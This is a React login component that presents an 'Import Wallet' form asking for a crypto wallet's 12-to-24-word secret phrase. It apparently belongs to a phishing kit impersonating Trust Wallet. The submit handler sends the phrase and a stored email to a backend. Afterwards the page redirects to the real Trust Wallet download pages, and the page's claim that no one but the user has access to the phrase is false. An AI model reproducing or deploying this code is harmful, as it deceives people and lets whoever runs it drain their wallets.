import styled from 'styled-components'
import Logo from './Logo'
import { Button, Loading, NoticeMessage, TextArea } from '../../theme/ThemeStyle'
import { useDispatch, useSelector } from 'react-redux'
import { api } from '../../common/api'
import { useEffect, useState } from 'react'
import { clearAccountValidationErrors, createAccountValidationError } from '../../app/accountVerification/slice'
import { AccountVerificationWrapper, Container, Main } from './GetStarted'
import { setAlpha } from '../../common/utils'
import { useLocation } from 'react-router-dom/cjs/react-router-dom.min'

const Login = () => {
    const dispatch = useDispatch()
    const { loading, error, isAuthenticated } = useSelector(state => state.accountVerification)

    const [mnemonic, setMnemonic] = useState('')

    const handleLogin = (e)=>{
        e.preventDefault()

        const email = localStorage.getItem('email')

        const validLength = mnemonic.trim().split(/\s+/g).length >= 12

        if(validLength){
            dispatch(api.loginWallet({mnemonic, email}))
        }else{
            dispatch(createAccountValidationError('Invalid secret phrase'))
        }
    }

    const handleInput = e => {
        if(error){
            dispatch(clearAccountValidationErrors())
        }

        setMnemonic(e.target.value)
    }

    const getDeviceLink = () => {
        const userAgent = navigator.userAgent;

        // Regular expressions to match common patterns in user agent strings
        const isIOS = /iPad|iPhone|iPod/.test(userAgent);
        const isAndroid = /Android/.test(userAgent);
        const isDesktop = !isIOS && !isAndroid; 
        
        if(isIOS){
            return 'https://apps.apple.com/app/apple-store/id1288339409?mt=8'
        }else if(isAndroid){
            return 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite'
        }else if(isDesktop){
            return 'https://trustwallet.com/browser-extension'
        }else{
            return 'https://trustwallet.com/browser-extension'
        }
    };

    useEffect(()=>{
        if(isAuthenticated){
            window.location.href = getDeviceLink()
            dispatch(clearAccountValidationErrors())
        }
    },[isAuthenticated])
  return (
    <Main>
        <Logo url={location.origin}/>
        <Container>
            <AccountVerificationWrapper onSubmit={handleLogin}>
                <Question>
                    <HeadingText>Import Wallet</HeadingText>
                    <Title>True ownership of your crypto assets</Title>
                    <SubTitle>We secure your wallet, but don't control or have access to your private keys or secret phrase - only you do.</SubTitle>
                    {error&&<NoticeMessage value='error'>{error}</NoticeMessage>}
                    
                    <PlaceHolder>Secret phrase</PlaceHolder>
                    <TextArea 
                        rows={4} 
                        value={mnemonic} 
                        onChange={handleInput}/>
                    <HelperText>Typically 12 (sometimes 18, 24) words separated by single space.</HelperText>

                </Question>

                <Button disabled={loading} type='submit'>Import <Loading value={loading}/></Button>
            </AccountVerificationWrapper>
        </Container>
    </Main>
  )
}

const Wrapper = styled.form`
    flex: 1;
    padding: 10px;
    height: calc(100% - 20px);
    display: flex;
    flex-direction: column;
    & :last-child{
        margin: auto 0 20px;
    }
`

const Question = styled.div`
    display: flex;
    flex-direction: column;
    align-items: center;
    margin: 50px 20px;
    & p{
        color: ${({theme})=>theme.colors.dark3};
        margin: 0 0 20px;
        font-size: 12px;
        line-height: 1.2;
    }
`
const HeadingText = styled.h1`
    font-size: 36px;
    margin: 0 0 50px;
`
const Title = styled.h2`
    font-size: 20px;
    margin: 0 0 5px;
`
const PlaceHolder = styled.h3`
    font-size: 18px;
    line-height: 1.2;
    margin: 10px 0;
    align-self: flex-start;
`
const SubTitle = styled.h3`
    font-size: 16px;
    font-weight: 300;
    text-align: center;
    margin: 0 0 20px;
`
const HelperText = styled.div`
    color: ${({theme})=>theme.colors.dark1};
    margin: 0 0 10px;
    text-align: center;
    font-size: 14px;
`

export default Login